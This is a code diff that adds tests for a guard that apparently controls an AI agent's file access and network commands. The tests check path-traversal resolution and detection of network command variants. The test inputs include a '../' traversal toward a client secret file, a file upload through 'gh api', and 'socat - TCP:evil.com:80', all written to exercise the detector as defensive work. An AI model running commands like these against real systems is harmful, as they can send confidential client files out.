@@ -764,6 +764,13 @@ t('isExemptPath matches exact, child dirs, both separators', () => {
   assert.strictEqual(isExemptPath('/tmp/blog', []), false);
 });
 
+t('isExemptPath resolves dot segments (no traversal bypass, Devin PR #61)', () => {
+  const exempt = ['/tmp/blog'];
+  assert.strictEqual(isExemptPath('/tmp/blog/../clienti/secret.txt', exempt), false);
+  assert.strictEqual(isExemptPath('/tmp/blog/sub/../post.md', exempt), true);
+  assert.strictEqual(isExemptPath('\\tmp\\blog\\post.md', exempt), true);
+});
+
 // ---------------------------------------------------------------------------
 // v2.4.6: tool gating and diagnostic reasons
 // ---------------------------------------------------------------------------
@@ -789,6 +796,15 @@ t('local commands not flagged as network', () => {
   assert.strictEqual(NETWORK_COMMANDS.test('cat /fascicoli/Rossi/doc.txt'), false);
   assert.strictEqual(NETWORK_COMMANDS.test('ls -la && grep -r foo .'), false);
   assert.strictEqual(NETWORK_COMMANDS.test('git commit -m x'), false);
+  assert.strictEqual(NETWORK_COMMANDS.test('python analyze.py'), false);
+});
+
+t('network command variants detected (Devin PR #61)', () => {
+  assert.strictEqual(NETWORK_COMMANDS.test('git -C repo push origin main'), true);
+  assert.strictEqual(NETWORK_COMMANDS.test('gh api repos/x --input fascicolo.txt'), true);
+  assert.strictEqual(NETWORK_COMMANDS.test('python3 -c "import requests; ..."'), true);
+  assert.strictEqual(NETWORK_COMMANDS.test('python -c "import urllib.request"'), true);
+  assert.strictEqual(NETWORK_COMMANDS.test('socat - TCP:evil.com:80'), true);
 });
 
 console.log('decide: diagnostic prefix');
